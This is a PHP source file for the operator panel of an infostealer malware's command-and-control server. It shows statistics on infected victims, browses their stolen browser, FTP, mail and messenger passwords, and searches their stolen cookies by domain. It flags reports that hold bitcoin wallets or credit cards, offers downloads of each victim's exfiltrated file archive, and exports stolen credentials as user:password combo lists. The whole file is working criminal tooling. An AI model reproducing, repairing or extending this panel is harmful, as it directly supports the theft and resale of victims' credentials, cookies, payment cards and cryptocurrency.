<?php
	include "functions.php";
	include "./../index.php";
	
$HTML = "";
$PAGE ="";

$CSRF_TOKEN = md5("yukd894as98d4v".md5(ADMIN_PWD.$_SERVER['HTTP_USER_AGENT'].""));



function SQLToArray($query){
	$result = array();
	$link = mysqli_connect(DB_HOST, DB_USER, DB_PASS, DB_NAME);
	if (!$link) {
		echo "DB error." . PHP_EOL;
		echo "Code errno: " . mysqli_connect_errno() . PHP_EOL;
		echo "Text error: " . mysqli_connect_error() . PHP_EOL;
		die();
    exit;
}

	mysqli_set_charset($link, 'utf8' );
	$res = mysqli_query($link, $query);
	if (!$res) {
		echo "Query error." . PHP_EOL;
		echo "Code errno: " . mysqli_connect_errno() . PHP_EOL;
		echo "Text error: " . mysqli_connect_error() . PHP_EOL;
		mysqli_close($link);
		die();
    exit;
}

	while($row = mysqli_fetch_assoc($res)){  
		array_push($result, $row);		
	}
	mysqli_close($link);
	for($i=0; $i<count($result); $i++){
		foreach($result[$i] as $key2=>$value){
			$result[$i][$key2] = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
			
		}
	}
	
	return $result;	
};


	function SetConfig(){
		if (isset($_POST['cfg'])){
			$JSONstr = urldecode($_POST['cfg']);	
			WriteToFile("config.json", $JSONstr);
	}			
			
	};

function ExecSQL($query){
	$link = mysqli_connect(DB_HOST, DB_USER, DB_PASS, DB_NAME);
	if (!$link) {
		echo "DB error." . PHP_EOL;
		echo "Code errno: " . mysqli_connect_errno() . PHP_EOL;
		echo "Text error: " . mysqli_connect_error() . PHP_EOL;
		die();
    exit;
	}	

	mysqli_set_charset($link, 'utf8' );
	$res = mysqli_query($link,$query);
	mysqli_close($link);
};
	
function LoadPageSkeleton(){
	global $HTML;
	global $CSRF_TOKEN;
	$HTML = FileToString("./html/fullpage.html");
	$HTML = str_replace("%csrf_token%", $CSRF_TOKEN, $HTML);	
};

function ShowMenu(){
	global $HTML;
	global $PAGE;
	$menu = FileToString('./html/menu.html');
	if($PAGE == "home") 		$menu=str_replace("%1%", "class='active has-sub'", $menu);
	if($PAGE == "reports") 		$menu=str_replace("%2%", "class='active has-sub'", $menu);
	if($PAGE == "passwords") 	$menu=str_replace("%3%", "class='active has-sub'", $menu);
	if($PAGE == "cookiesconverter") 	$menu=str_replace("%4%", "class='active has-sub'", $menu);
	if($PAGE == "importantlinks") 	$menu=str_replace("%5%", "class='active has-sub'", $menu);
	if($PAGE == "exporter") 	$menu=str_replace("%6%", "class='active has-sub'", $menu);
	$HTML = str_replace("%MENU%",$menu, $HTML);
};

function ShowImportantLinksPage(){	
	global $HTML;
	global $CSRF_TOKEN;  
	$HTML = str_replace("%PADE_DATA%", FileToString('./html/importantlinks.html'), $HTML);	
	$HTML = str_replace("%csrf_token%", $CSRF_TOKEN, $HTML);
	$HTML = str_replace("%links_data%", htmlspecialchars(FileToString('./links.txt'), ENT_QUOTES, 'UTF-8'), $HTML);
};
	
function ShowHomePage(){
	global $HTML;
	global $CSRF_TOKEN;
	$page=FileToString('./html/home.html');
	$tables='';
	$div="<div style='display: inline-block; vertical-align: top; padding: 5px'>";
	
	
	$c_all = SQLToArray("SELECT COUNT(*) AS c FROM reports")[0]['c'];


	$c_today = SQLToArray("SELECT COUNT(*) AS c FROM reports 
WHERE YEAR(reports.date) = YEAR(NOW()) AND MONTH(reports.date) = MONTH(NOW()) AND WEEK(reports.date, 1) = WEEK(NOW(), 1) AND DAY(reports.date) = DAY(NOW())")[0]['c'];

	$c_week =  SQLToArray("SELECT COUNT(*) AS c FROM reports 
WHERE YEAR(reports.date) = YEAR(NOW()) AND MONTH(reports.date) = MONTH(NOW()) AND WEEK(reports.date, 1) = WEEK(NOW(), 1)")[0]['c'];


	$c_month = SQLToArray("SELECT COUNT(*) AS c FROM reports 
WHERE YEAR(reports.date) = YEAR(NOW()) AND MONTH(reports.date) = MONTH(NOW())")[0]['c'];

	$c_stat = array(
				array('All', $c_all),
				array('Today', $c_today),
				array('Week', $c_week),
				array('Month', $c_month),
				);

	$tables .=$div."Reports count".build_table($c_stat,  
								array('', ''), 
								"stat-table",
								array(' ', ' '),
								'reportsgrid'
								)."</div>";
								
	$tmp = 	SQLToArray("SELECT country, COUNT(*) AS CountRec, 
										COUNT(*)/(SELECT COUNT(*) FROM reports)*100 AS percent
									  FROM reports
									  GROUP BY `country`
									  ORDER BY CountRec DESC");
	for($i=0; $i<count($tmp); $i++)	{
		$tmp[$i]['country'] = "<img src='img/flags/".strtolower($tmp[$i]['country']).".png'> ".$tmp[$i]['country'];
	}								
	$tables .=$div."Country stats".build_table($tmp,  
								array('Country', 'count', '%'), 
								"stat-table",
								array(' ', ' ', ' '),
								'reportsgrid'
								)."</div>";
								
								
								
	$tables .=$div."Arch stats".build_table(SQLToArray(" SELECT `os_arch`, COUNT(*) AS CountRec, COUNT(*)/(SELECT COUNT(*) FROM reports)*100 AS percent
										  FROM reports
										  GROUP BY `os_arch`
										  ORDER BY CountRec DESC"),  
								array('Arch', 'count', '%'), 
								"stat-table",
								array(' ', ' ', ' '),
								'reportsgrid'
								)."</div>";
								
	$tmp = 	SQLToArray("SELECT `os_ver`, COUNT(*) AS CountRec, COUNT(*)/(SELECT COUNT(*) FROM reports)*100 AS percent
										  FROM reports
										  GROUP BY `os_ver`
										  ORDER BY CountRec DESC");
	for($i=0; $i<count($tmp); $i++)	{
		$tmp[$i]['os_ver'] = "<img src='img/win/".strtolower($tmp[$i]['os_ver']).".png'> ".$tmp[$i]['os_ver'];
	}							
								
	$tables .=$div."OS stats".build_table($tmp,  
								array('OS', 'count', '%'), 
								"stat-table",
								array(' ', ' ', ' '),
								'reportsgrid'
								)."</div>";
								
	$tables .=$div."Rights stats".build_table(SQLToArray(" SELECT `bin_rights`, COUNT(*) AS CountRec, COUNT(*)/(SELECT COUNT(*) FROM reports)*100 AS percent
										  FROM reports
										  GROUP BY `bin_rights`
										  ORDER BY CountRec DESC"),  
								array('Rights', 'count', '%'), 
								"stat-table",
								array(' ', ' ', ' '),
								'reportsgrid'
								)."</div>";
	
		$tables .=$div."Binary type stats".build_table(SQLToArray("  SELECT `bin_type`, COUNT(*) AS CountRec, COUNT(*)/(SELECT COUNT(*) FROM reports)*100 AS percent
  FROM reports
  GROUP BY `bin_type`
  ORDER BY CountRec DESC"),  
								array('Type', 'count', '%'), 
								"stat-table",
								array(' ', ' ', ' '),
								'reportsgrid'
								)."</div>";
								
		$arr = SQLToArray("  SELECT `p_soft_type`, COUNT(*) AS CountRec, COUNT(*)/(SELECT COUNT(*) FROM passwords)*100 AS percent
				  FROM passwords
				  GROUP BY `p_soft_type`
				  ORDER BY CountRec DESC");
		for ($i=0; $i<sizeof($arr); $i++)
		{
			if($arr[$i]["p_soft_type"] ==  "1") $arr[$i]["p_soft_type"]="Browsers";
			if($arr[$i]["p_soft_type"] ==  "2") $arr[$i]["p_soft_type"]="FTP Clients";
			if($arr[$i]["p_soft_type"] ==  "3") $arr[$i]["p_soft_type"]="Mail Clients";
			if($arr[$i]["p_soft_type"] ==  "4") $arr[$i]["p_soft_type"]="IM Clients";
		};
		$tables .=$div."Passwords type stats".build_table($arr,  
								array('Type', 'count', '%'), 
								"stat-table",
								array(' ', ' ', ' '),
								'reportsgrid'
								)."</div>";
		$tmp = 	SQLToArray(" SELECT p_soft_name, COUNT(*) AS CountRec, COUNT(*)/(SELECT COUNT(*) FROM passwords)*100 AS percent
															  FROM passwords
															  GROUP BY `p_soft_name`
															  ORDER BY CountRec DESC");	
		for($i=0; $i<count($tmp); $i++)	{
			$tmp[$i]["p_soft_name"] = "<img src='img/softs/".$tmp[$i]['p_soft_name'].".png'> ".$tmp[$i]['p_soft_name'];
		}														
		$tables .=$div."Software stats".build_table($tmp,  
								array('Soft', 'count', '%'), 
								"stat-table",
								array(' ', ' ', ' '),
								'reportsgrid'
								)."</div>";							

	$page=str_replace("%STATS%", $tables, $page);
	
	
	
	$config = FileToString('./config.json');
	$page = str_replace("%JSONstr%", base64_encode($config), $page);
	
			
	$HTML = str_replace("%PADE_DATA%", $page, $HTML);
	$HTML = str_replace("%csrf_token%", $CSRF_TOKEN, $HTML);
};

function ShowReportsPage(){
	foreach ($_GET as $value) {
		if (is_array($value)) die();		
	}
	global $HTML;
	
	$link = mysqli_connect(DB_HOST, DB_USER, DB_PASS, DB_NAME);	
	$query="SELECT  concat(reports.date, ' ',reports.time),
					concat(reports.country, ' ',reports.ip) AS country_ip,	
					concat(reports.compname, '(',reports.username,')') AS comp_user,
					concat(reports.os_ver, '||',reports.os_name, '(',os_arch,')') AS windows,
					reports.m_id AS m_id,
					reports.r_id,
					reports.comment,
					concat(reports.passwords_count, ' | ', reports.btc_count,' | ',reports.cc_count,' | ',reports.files_count),
					concat(reports.bin_type, '|', reports.bin_rights) AS bin,
					concat(reports.filename) AS filename
			FROM reports ";
	if(isset($_GET['cookiesearch'])) if(($_GET['cookiesearch'])!='')$query.=" JOIN cookies ON reports.r_id = cookies.r_id ";
	if(isset($_GET['inc_il']))  if ($_GET['inc_il']=="1") $query .=" JOIN passwords ON reports.r_id = passwords.r_id ";
	$query.=" WHERE 1=1 ";
	
	if(isset($_GET['datefrom'])) if(($_GET['datefrom'])!='') {	
		$query .= " AND reports.date>='".mysqli_real_escape_string($link, $_GET['datefrom'])."'";
		
		
	};
	if(isset($_GET['dateup'])) if(($_GET['dateup'])!='') 		$query .= " AND reports.date<='".mysqli_real_escape_string($link, $_GET['dateup'])."'";
	if(isset($_GET['search']))	if(strlen($_GET['search'])>0)		$query .= " AND LOCATE('".mysqli_real_escape_string($link, $_GET['search'])."', concat_ws('|', reports.country, reports.ip, reports.compname,reports.username,reports.os_name,reports.comment))";
	
	if(isset($_GET['countries']))	
		if(strlen($_GET['countries'])>0)	
			$query .= " AND LOCATE(reports.country, '".mysqli_real_escape_string($link, $_GET['countries'])."' ) ";
	
	if(isset($_GET['cookiesearch'])) if(($_GET['cookiesearch'])!='') 
		//$query .= " AND (LOCATE('".$_GET['cookiesearch']."', cookies.domain) AND reports.r_id = cookies.r_id) ";
		$query .=" AND LOCATE('".mysqli_real_escape_string($link, $_GET['cookiesearch'])."', cookies.domain)";
	if(isset($_GET['inc_btc'])) if ($_GET['inc_btc']=="1") $query .=" AND reports.btc_count>0";
	if(isset($_GET['inc_cc']))  if ($_GET['inc_cc']=="1") $query .=" AND reports.cc_count>0";
	if(!isset($_GET['status']))  $query .=" AND reports.trashed=0";
	if(isset($_GET['status']))  if ($_GET['status']=="0") $query .=" AND reports.trashed=0";
	if(isset($_GET['status']))  if ($_GET['status']=="1") $query .=" AND reports.trashed=1";
	
	
	if(isset($_GET['inc_il']))  if ($_GET['inc_il']=="1") 
	{	
			$query .= " AND ( ";
			$links = explode("\r\n", FileToString("./links.txt"));
			foreach ($links as $key => $value) {
					//echo $value;
					$query .= "(passwords.p_p1 LIKE '".mysqli_real_escape_string($link, $value)."') OR";
			}
	
	$query = substr($query,0,-2);	
	$query .= " ) ";
	}
	
	$query .=" GROUP BY reports.r_id";
	$query .=" ORDER BY concat(reports.date, ' ',reports.time) DESC";
	mysqli_close($link);
	

	//$query .=" LIMIT 28,5";
	//die($query);
	
	/*
	$isTryInject = false;
	foreach ($_GET as $value) {
		if (strripos($value, "'") !== false) 
			$isTryInject = true;
	}
	if (!$isTryInject)*/
	//echo $query;
	
	
	$report = SQLToArray($query);
	
	$report=array_values($report);/*<button id=',reports.r_id ,' onclick=%js_func%>Delete</button>*/

	
	for($i=0; $i<count($report); $i++){
/*
		foreach($report[$i] as $key2=>$value){
			$report[$i][$key2] = antixss($value);
			
		}
*/
		$actionscode="	<a href='?page=passwords&r_id=%s&soft_type1=1&soft_type2=1&soft_type3=1&soft_type4=1'><button>Open</button></a>
						<a href='files/%s' download><button style='width: 100px;  text-align: left;'>DL %s</button></a>
						<button onclick='%s'>Del</button>";
		$actionscode=sprintf($actionscode,
							$report[$i]["r_id"],
							$report[$i]["filename"],
							human_filesize(@filesize("./files/".$report[$i]["filename"]), 1),
							'deleteRow(this); sendPost("action=DeleteReport&r_id='.$report[$i]["r_id"].'"); '
							);
		$report[$i]["filename"]=$actionscode;
		$country_ip=explode(' ', strtolower($report[$i]["country_ip"]));
		$report[$i]["country_ip"]="<img src='img/flags/$country_ip[0].png'>".strtoupper($country_ip[0])." | $country_ip[1]";
		

		$windows=explode('||', $report[$i]["windows"]);
		$report[$i]["windows"]="<img src='img/win/$windows[0].png' onerror='this.src='''> ".$windows[1];
		

		$report[$i]["bin"].='&nbsp';
		$report[$i]["comment"]=sprintf("<input style='width: %s', type='text' value='%s' onkeydown='%s'",
								"100%",

								htmlentities($report[$i]['comment']),
								"if(event.keyCode==13){sendPost(".'"action=AddReportComment&r_id='.$report[$i]["r_id"].'&comment="+encodeURIComponent(this.value)'.")}"
								);
								

		

	};
	$reportstable=build_table($report,  
								array('Date time ', 'Country | IP', 'Comp(user)', 'Windows', 'MachineID', '#','<abbr title="Press enter to save">Comment</abbr>', 'pwd|btc|cc|files', '<abbr title="T - binary type: exe(E)/dll(D)    R - rights. user(U)/admin(A)/guest(G)/system(S); ">T|R</abbr>', 'Actions'), 
								"reports-table",
								array(' ', ' ', ' ', ' ', ' ', ' ',' ', ' style="width: 20%"',' style="width: 7%"', ' align="right" width="1%" nowrap',' align="right" width="1%" nowrap'),
								'reportsgrid'
								);
	

	
	$templ = FileToString('./html/reports.html');
	$templ = str_replace("%count%", 
				count($report),
				$templ);

	$HTML = str_replace("%PADE_DATA%", 
			$templ.$reportstable,
			$HTML);
	
};

function ShowPasswordsPage(){
	foreach ($_GET as $value) {
		if (is_array($value)) die();
		
	}
	$link = mysqli_connect(DB_HOST, DB_USER, DB_PASS, DB_NAME);	
	$query="SELECT  passwords.p_soft_name,
					passwords.p_p1,	
					passwords.p_p2,
					passwords.p_p3,
					passwords.r_id
			FROM passwords, reports
			WHERE reports.r_id=passwords.r_id AND passwords.p_soft_name<>''
			";
	if(isset($_GET['search']))	if(strlen($_GET['search'])>0)		$query .= " AND LOCATE('".mysqli_real_escape_string($link, $_GET['search'])."', concat_ws('|', passwords.p_soft_name, passwords.p_p1, passwords.p_p2,passwords.p_p3,passwords.r_id))";
	if(isset($_GET['datefrom'])) if(($_GET['datefrom'])!='') 	$query .= " AND reports.date>='".mysqli_real_escape_string($link, $_GET['datefrom'])."'"; 
	
	if(isset($_GET['dateup'])) if(($_GET['dateup'])!='') 		$query .= " AND reports.date<='".mysqli_real_escape_string($link, $_GET['dateup'])."'";
	if(isset($_GET['soft_type1']))  {if ($_GET['soft_type1']=="1") $query .=" ";} else $query .=" AND passwords.p_soft_type<>1";
	if(isset($_GET['soft_type2']))  {if ($_GET['soft_type2']=="1") $query .=" ";} else $query .=" AND passwords.p_soft_type<>2";
	if(isset($_GET['soft_type3']))  {if ($_GET['soft_type3']=="1") $query .=" ";} else $query .=" AND passwords.p_soft_type<>3";
	if(isset($_GET['soft_type4']))  {if ($_GET['soft_type4']=="1") $query .=" ";} else $query .=" AND passwords.p_soft_type<>4";
	if(isset($_GET['r_id']))  {if (($_GET['r_id']<>"") and (is_numeric($_GET['r_id']))) $query .=" AND passwords.r_id=".mysqli_real_escape_string($link, $_GET['r_id']);};
	//echo $query;
	if(isset($_GET['inc_il']))  if ($_GET['inc_il']=="1") 
	{	
			$query .= " AND ( ";
			$links = explode("\r\n", FileToString("./links.txt"));
			foreach ($links as $key => $value) {
					//echo $value;
					$query .= "(passwords.p_p1 LIKE '".mysqli_real_escape_string($link, $value)."') OR";
			}
	
	$query = substr($query,0,-2);	
	$query .= " ) ";
	}
	
	$query .=" ORDER BY passwords.p_soft_type, passwords.p_soft_name";
	
	


	
		

	mysqli_close($link);
	$report = SQLToArray($query);
	
	
	
	$machine="";
	if(isset($_GET['r_id']))  {if (($_GET['r_id']<>"") and (is_numeric($_GET['r_id']))) 
		$machineA = SQLToArray("SELECT  concat(reports.date, ' ',reports.time),
					concat(reports.country, ' ',reports.ip) AS country_ip,	
					concat(reports.compname, '(',reports.username,')') AS comp_user,
					concat(reports.os_ver, '||',reports.os_name, '(',os_arch,')') AS windows,
					reports.m_id AS m_id,
					reports.r_id,
					reports.comment,
					concat(reports.passwords_count, ' | ', reports.btc_count,' | ',reports.cc_count,' | ',reports.files_count),
					concat(reports.bin_type, '|', reports.bin_rights) AS bin,
					concat(reports.filename)
			FROM reports
			WHERE reports.r_id=".$_GET['r_id']." GROUP BY reports.r_id");
			
		
		if (sizeof(@$machineA)==1){
			$i=0;
			/*foreach($machineA[$i] as $key2=>$value){
				$machineA[$i][$key2] = antixss($value);
			
			}*/
			$filename = $machineA[$i]["concat(reports.filename)"];			
			$actionscode="	<a href='?page=passwords&r_id=%s&soft_type1=1&soft_type2=1&soft_type3=1&soft_type4=1'><button>Open</button></a>
							<a href='files/$filename' download><button style='width: 100px;  text-align: left;'>DL %s</button></a>
							<button onclick='%s'>Del</button>";
			$actionscode=sprintf($actionscode,
								$machineA[$i]["r_id"],
								human_filesize(@filesize("./files/$filename"), 1),
								'deleteRow(this); sendPost("action=DeleteReport&r_id='.$machineA[$i]["r_id"].'")'
								);
			
			$machineA[$i]["concat(reports.filename)"]=$actionscode;
			$country_ip=explode(' ', strtolower($machineA[$i]["country_ip"]));
			$machineA[$i]["country_ip"]="<img src='img/flags/$country_ip[0].png'>".strtoupper($country_ip[0])." | $country_ip[1]";

			$windows=explode('||', $machineA[$i]["windows"]);
			$machineA[$i]["windows"]="<img src='img/win/$windows[0].png'> ".$windows[1];

			$machineA[$i]["bin"].='&nbsp';
			$machineA[$i]["comment"]=sprintf("<input style='width: %s', type='text' value='%s' onkeydown='%s'",
									"100%",
									htmlspecialchars($machineA[$i]['comment'], ENT_QUOTES),
									//htmlentities($report[$i]['comment']),
									"if(event.keyCode==13){sendPost(".'"action=AddReportComment&r_id='.$machineA[$i]["r_id"].'&comment="+encodeURIComponent(this.value)'.")}"
									);	
			
			$machine= build_table($machineA,  
									array('Date time ', 'Country | IP', 'Comp(user)', 'Windows', 'MachineID', '#','<abbr title="Press enter to save">Comment</abbr>', 'pwd|btc|cc|files', '<abbr title="T - binary type: exe(E)/dll(D)    R - rights. user(U)/admin(A)/guest(G)/system(S); ">T|R</abbr>', 'Actions'), 
									"reports-table",
									array(' ', ' ', ' ', ' ', ' ', ' ',' ', ' style="width: 20%"',' style="width: 7%"', ' align="right" width="1%" nowrap',' align="right" width="1%" nowrap'));
		}
	};
	
	for($i=0; $i<count($report); $i++){
		/*foreach($report[$i] as $key2=>$value){
			$report[$i][$key2] = antixss($value);
			}*/
		/*$report[$i]["p_soft_name"]=htmlspecialchars($report[$i]['p_soft_name'], ENT_QUOTES);
		$report[$i]["p_p1"]=htmlspecialchars($report[$i]['p_p1'], ENT_QUOTES);
		$report[$i]["p_p2"]=htmlspecialchars($report[$i]['p_p2'], ENT_QUOTES);
		$report[$i]["p_p3"]=htmlspecialchars($report[$i]['p_p3'], ENT_QUOTES);*/

		
		$report[$i]["p_soft_name"]="<img src='img/softs/".$report[$i]['p_soft_name'].".png'>".$report[$i]['p_soft_name'];
		//$tmp[$i]['p_soft_name'] = "<img src=img/softs/".$tmp[$i]['p_soft_name'].".png> ".$tmp[$i]['p_soft_name'];
		
		$r_id=$report[$i]["r_id"];
		$report[$i]["r_id"]="<a href='?page=passwords&r_id=$r_id&soft_type1=1&soft_type2=1&soft_type3=1&soft_type4=1'><button>$r_id</button></a>";
	};
	
	
	
	$reportstable=build_table($report,  
								array('Soft name', 'URL', 'Username', 'Password', 'ReportID'), 
								"reports-table",
								array(' ', ' ', ' ',  ' ',' ' ,' align="right" width="1%" nowrap '));
	global $HTML;
	$templ = str_replace("%count%", 
				count($report),
				FileToString('./html/passwords.html'));
	$HTML = str_replace("%PADE_DATA%", $templ.$machine.$reportstable, $HTML);
};




function ShowConverterPage(){	
	global $HTML;
	$HTML = str_replace("%PADE_DATA%", FileToString('./html/cookiesconverter.html'), $HTML);
};


function ShowExporterPage(){
	
	global $HTML;
	global $CSRF_TOKEN;
	$exporter_data="";
	$query = "";
	if (isset($_POST['export_type']))
	{
		if ($_POST['csrf_token'] != $CSRF_TOKEN) die('');
		if ($_POST['export_type'] == "0") $query = "SELECT DISTINCT passwords.p_p3 AS line FROM `passwords`";
		if ($_POST['export_type'] == "1") $query = "SELECT DISTINCT passwords.p_p2 AS line FROM `passwords`";
		if ($_POST['export_type'] == "2") $query = "SELECT DISTINCT concat(passwords.p_p1,'@',passwords.p_p2,':',passwords.p_p3) AS line FROM `passwords`";
		if ($_POST['export_type'] == "3") $query = "SELECT DISTINCT concat(passwords.p_p2,':',passwords.p_p3) AS line FROM `passwords` WHERE passwords.p_p2<>'' AND passwords.p_p3<>''" ;
		
		if ($_POST['export_type'] == "4") $query = "SELECT DISTINCT concat('SOFT:',Char(9),passwords.p_soft_name,Char(13),Char(10), 'HOST:',Char(9),passwords.p_p1,Char(13),Char(10),'USER:',Char(9),passwords.p_p2,Char(13),Char(10),'PASS:',Char(9),p_p3,Char(13),Char(10)) AS line FROM `passwords`";
		
		if($query!=""){
			$data = SQLToArray($query);
			foreach($data as $key => $value){
				$exporter_data .= $value['line']."\r\n";
			}
		}
		
	}
	$exporter_data = htmlspecialchars($exporter_data, ENT_QUOTES, 'UTF-8');
	$exporter_data = str_replace('<', '&lt;', $exporter_data);
	$HTML = str_replace("%PADE_DATA%", FileToString('./html/exporter.html'), $HTML);
	$HTML = str_replace("%csrf_token%", $CSRF_TOKEN, $HTML);
	$HTML = str_replace("%exporter_data%", $exporter_data, $HTML);
};

function ShowServerinfoPage(){
		global $HTML;
		$HTML = str_replace("%PADE_DATA%", FileToString('./html/serverinfo.html'), $HTML);
		$HTML = str_replace("%phpversion%", phpversion(), $HTML);
		
		
		$HTML = str_replace("%post_max_size%", ini_get('post_max_size'), $HTML);
		$HTML = str_replace("%upload_max_filesize%", ini_get('upload_max_filesize'), $HTML);
		$HTML = str_replace("%max_input_time%", ini_get('max_input_time'), $HTML);
		$HTML = str_replace("%max_execution_time%", ini_get('max_execution_time'), $HTML);
		$HTML = str_replace("%memory_limit%", ini_get('memory_limit'), $HTML);
		$HTML = str_replace("%error_log%", ini_get('error_log'), $HTML);
		
		$HTML = str_replace("%iconv%", function_exists('iconv') ? '+' : '-', $HTML);
		$HTML = str_replace("%zipmodule%", class_exists('ZipArchive') ? '+' : '-', $HTML);
		$HTML = str_replace("%jsonmodule%", function_exists('json_decode') ? '+' : '-', $HTML);
		
		clearstatcache();
		
		$HTML = str_replace("%filesw%", is_writable("./files/") ? '+' : '-', $HTML);
		$HTML = str_replace("%configw%", is_writable("./config.json") ? '+' : '-', $HTML);
		$HTML = str_replace("%linksw%", is_writable("./links.txt") ? '+' : '-', $HTML);
	
		
		$data="";
		foreach (ini_get_all(null, false) as $key => $value) $data.= "$key = $value;<br>";
		$HTML = str_replace("%phpini%", $data, $HTML);
		
		
};
	
function ProcessAction(){
	global $CSRF_TOKEN;
	if ($_POST['csrf_token'] != $CSRF_TOKEN) die('');
	
	$result = array();
	$link = mysqli_connect(DB_HOST, DB_USER, DB_PASS, DB_NAME) or die('No connect: ' . mysql_error());
	if($_POST['action']=="AddReportComment"){
		$query=sprintf("UPDATE reports
				SET reports.comment='%s'
				WHERE reports.r_id='%s'",
				mysqli_real_escape_string($link, $_POST['comment']),
				mysqli_real_escape_string($link, $_POST['r_id']));
		
			ExecSQL($query);
	}	
	
		if($_POST['action']=="DeleteReport"){
		$query=sprintf("UPDATE reports
				SET reports.trashed='1'
				WHERE reports.r_id='%s'",
				mysqli_real_escape_string($link, $_POST['r_id']));
		
			ExecSQL($query);
	}
	if($_POST['action']=="SetConfig") {
			SetConfig();
	}
	
	if($_POST['action']=="EmptyTrash") {
		
		$filenames = SQLToArray("SELECT reports.filename FROM reports WHERE reports.trashed = 1");
		ExecSQL("DELETE FROM passwords
					WHERE passwords.r_id IN (SELECT reports.r_id FROM reports WHERE reports.trashed = 1)");
		ExecSQL("DELETE FROM cookies
					WHERE cookies.r_id IN (SELECT reports.r_id FROM reports WHERE reports.trashed = 1)");
				
		ExecSQL("DELETE FROM reports
					WHERE reports.trashed = 1");

		foreach ($filenames as $filename){
			$isH = false;
			if (strripos($value, "/") !== false) $isH = true; 
			if (strripos($value, "\\") !== false) $isH = true; 
			if (!$isH)
				@unlink("./files/".$filename['filename']);
		}
		header("Location: ".$_SERVER["REQUEST_URI"]);
	}
	
	
	if($_POST['action']=="Empty0000") {
		
		$filenames = SQLToArray("SELECT reports.filename FROM reports WHERE reports.files_count=0 and reports.btc_count=0 and reports.cc_count=0 and reports.passwords_count=0");
		ExecSQL("DELETE FROM passwords
					WHERE passwords.r_id IN (SELECT reports.r_id FROM reports WHERE reports.files_count=0 and reports.btc_count=0 and reports.cc_count=0 and reports.passwords_count=0)");
		ExecSQL("DELETE FROM cookies
					WHERE cookies.r_id IN (SELECT reports.r_id FROM reports WHERE reports.files_count=0 and reports.btc_count=0 and reports.cc_count=0 and reports.passwords_count=0)");
				
		ExecSQL("DELETE FROM reports
					WHERE reports.files_count=0 and reports.btc_count=0 and reports.cc_count=0 and reports.passwords_count=0");

		foreach ($filenames as $filename){
			$isH = false;
			if (strripos($value, "/") !== false) $isH = true; 
			if (strripos($value, "\\") !== false) $isH = true; 
			if (!$isH)
				@unlink("./files/".$filename['filename']);
		}
		header("Location: ".$_SERVER["REQUEST_URI"]);
	}
		if($_POST['action']=="DeleteAll") {
			ExecSql("TRUNCATE TABLE passwords");
			ExecSql("TRUNCATE TABLE reports");
			ExecSql("TRUNCATE TABLE cookies");
			
			if (file_exists('./files'))
				foreach (glob('./files/*.zip') as $file)
					unlink($file);
			header("Location: ".$_SERVER["REQUEST_URI"]);
	}
	
			if($_POST['action']=="SetLinks") {
				$ldata=$_POST['data'];
				$ldata = str_replace('<', '&lt;', $ldata);
				$ldata = str_replace('"', '', $ldata);
				$ldata = str_replace("'", '', $ldata);
				WriteToFile("./links.txt", $ldata);
				header("Location: ".$_SERVER["REQUEST_URI"]);
			}
};
	
function Main(){
	if (isset($_POST['action'])) {
			ProcessAction();
			die();
		}; 
	global $PAGE;
	global $HTML;
	if(isset($_GET['page'])){
		$PAGE=$_GET['page'];
	}else{
		$PAGE="home";
	};
	
	LoadPageSkeleton();
	ShowMenu();
	if($PAGE == "home") 		ShowHomePage();
	if($PAGE == "reports") 		ShowReportsPage();
	if($PAGE == "passwords") 	ShowPasswordsPage();
	if($PAGE == "cookiesconverter") 	ShowConverterPage();
	if($PAGE == "serverinfo") 	ShowServerinfoPage();
	if($PAGE == "importantlinks") 	ShowImportantLinksPage();
	if($PAGE == "exporter") ShowExporterPage();
	
	if($PAGE == "logout")		{
		header('Set-cookie: pwd=0; httpOnly' );
		header("Location: ". $_SERVER['PHP_SELF']);
	}
	
	echo $HTML;
};

function Auth(){
	if (@$_POST['auth']=="1"){
		sleep(2);
		if (@$_POST['password']==ADMIN_PWD)
		{
			header('Set-cookie: pwd='.md5($_POST['password'].$_SERVER['HTTP_USER_AGENT']."").'; httpOnly' );
			header("Location: ".$_SERVER['PHP_SELF']);
		};
	};
};
	Auth();
	if((@$_COOKIE["pwd"]) != md5(ADMIN_PWD.$_SERVER['HTTP_USER_AGENT']."")) die(FileToString('./html/login.html'));
	Main();	
?>